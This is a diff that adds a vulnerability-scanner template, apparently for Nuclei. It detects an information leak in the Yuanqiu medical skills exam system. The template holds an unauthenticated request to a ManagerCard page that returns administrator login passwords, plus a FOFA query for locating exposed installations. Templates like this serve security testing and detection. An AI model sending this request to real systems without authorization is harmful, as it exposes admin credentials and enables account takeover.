@@ -1,0 +1,33 @@
+id: yuanqiu-ManagerCard-disclosure
+info:
+  name: 远秋医学技能考试系统存在信息泄漏
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: title="远秋医学技能考试系统"
+    tips:
+    repair:
+    version:
+  tags: yuanqiu,disclosure
+
+http:
+  - raw:
+      - |
+        GET /User/ManagerCard.aspx?ty=&guid=&op=2&id=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.766.13 Safari/537.36
+        Accept: */*
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'管理员设置','登录密码')
+        condition: and
